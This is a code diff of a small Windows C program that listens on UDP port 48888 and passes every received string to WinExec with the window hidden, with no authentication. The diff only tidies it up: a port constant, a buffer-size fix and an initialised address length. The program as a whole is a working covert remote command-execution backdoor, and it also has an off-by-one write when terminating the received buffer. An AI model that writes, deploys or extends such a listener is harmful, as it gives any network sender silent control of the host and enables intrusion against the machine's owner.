@@ -4,8 +4,8 @@
 
 #include <Windows.h>
 
-#define BUFFER_SIZE 2028
-#define PORT 48888
+const int PORT = 48888;
+#define BUFFER_SIZE 2048
 char buff[BUFFER_SIZE];
 
 int start_server() {
@@ -39,15 +39,16 @@ int start_server() {
         return -1;
     }
 
-    printf("Listening on %s:%d...\n", inet_ntoa(local_addr.sin_addr), 48888);
+    printf("Listening on %s:%d...\n", inet_ntoa(local_addr.sin_addr), PORT);
 
-    SOCKADDR source_addr;
-    int from_len;
+    SOCKADDR_IN source_addr;
+    int from_len = sizeof(SOCKADDR);
     while (TRUE) {
         int len = recvfrom(s, buff, BUFFER_SIZE, 0, (PSOCKADDR) &source_addr, &from_len);
+        printf("%d\n", len);
         if (len > 0) {
             buff[len] = 0;
-            printf("execute command [%s]\n", buff);
+            printf("executing command [%s]\n", buff);
 
             int ret = WinExec(buff, SW_HIDE);
             if (ret > 31) {
@@ -64,7 +65,7 @@ int start_server() {
 int main() {
     InitWinsock();
 
-    int ret = start_server();
+    start_server();
     printf("start_server() failed.\n");
 
     CleanupWinsock();
